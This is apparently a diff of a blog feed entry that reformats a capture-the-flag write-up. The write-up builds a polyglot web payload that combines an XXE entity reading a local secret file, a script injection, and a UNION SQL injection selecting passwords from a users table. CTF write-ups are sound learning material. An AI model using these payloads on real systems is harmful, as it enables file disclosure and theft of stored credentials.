@@ -136,24 +136,25 @@ a comment on the end with <code>#</code>:</p>
 </code></pre></div><p>It was a bit of a struggle to get the js to work (need to inject <code>xss=true;</code>), even with the assist of
 sanitize-html. The sanitize-html call basically stripped out all of the xml
 and comments, which was mostly helpful, so something like this almost works:</p>
-<pre><code>&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;file:///home/gnx/script/xxe_secret&quot;&gt;&lt;r&gt;;xss=true;//&amp;xxe;&lt;/r&gt;
-&lt;!--' union select password from users limit 1;#--&gt;
-</code></pre><p>But you end up with something like: <code>]&gt;;xss=true;//&amp;xxe;</code> and the <code>];</code> doesn&rsquo;t
+<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span><span class="nt">&lt;r&gt;</span>;xss=true;//<span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
+<span class="c">&lt;!--&#39; union select password from users limit 1;#--&gt;</span>
+</code></pre></div><p>But you end up with something like: <code>]&gt;;xss=true;//&amp;xxe;</code> and the <code>];</code> doesn&rsquo;t
 run.</p>
 <p>I spent a while struggling with this piece, until a teammate suggested trying
 another entity to inject a comment around the garbage:</p>
-<pre><code>&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;file:///home/gnx/script/xxe_secret&quot;&gt;
-&lt;!ENTITY xxe2 SYSTEM &quot;xxe_seed&gt;/*&quot;&gt;]&gt;&lt;r&gt;*/xss=true;//&amp;xxe;&lt;/r&gt;
-&lt;!--' union select password from users;#--&gt;
-</code></pre><p>And the last piece was figuring out how many columns was in the posts table, so
+<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span>
+<span class="cp">&lt;!ENTITY xxe2 SYSTEM &#34;xxe_seed&gt;</span>/*&#34;&gt;]&gt;<span class="nt">&lt;r&gt;</span>*/xss=true;//<span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
+<span class="c">&lt;!--&#39; union select password from users;#--&gt;</span>
+</code></pre></div><p>And the last piece was figuring out how many columns was in the posts table, so
 we could match the union injection&ndash;took a few tries, but I just tacked on <code>,1</code>
 until it ran and gave the flag. I think it was 4 columns, but don&rsquo;t remember at
 this point. The <code>limit 1</code> isn&rsquo;t necessary but it seemed kind not to pull in the whole
 table cartesian product ;) &ndash;the result was something like this:</p>
-<pre><code>&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;file:///home/gnx/script/xxe_secret&quot;&gt;
-&lt;!ENTITY xxe2 SYSTEM &quot;xxe_seed&gt;/*&quot;&gt;]&gt;&lt;r&gt;*/xss=true;//&amp;xxe;&lt;/r&gt;
-&lt;!--' union select password, 1, 1, 1 from users limit 1;#--&gt;
-</code></pre>]]></content>
+<div class="highlight"><pre class="chroma"><code class="language-payload.xml" data-lang="payload.xml"><span class="cp">&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;</span>
+<span class="cp">&lt;!ENTITY xxe2 SYSTEM &#34;xxe_seed&gt;</span>/*&#34;&gt;]&gt;<span class="nt">&lt;r&gt;</span>*/xss=true;//<span class="ni">&amp;xxe;</span><span class="nt">&lt;/r&gt;</span>
+<span class="c">&lt;!--&#39; union select password, 1, 1, 1 from users limit 1;#--&gt;</span>
+</code></pre></div><p>Note: it needs to be all one one line, but I broke it up for visibility.</p>
+]]></content>
 		</item>
 		
 	</channel>
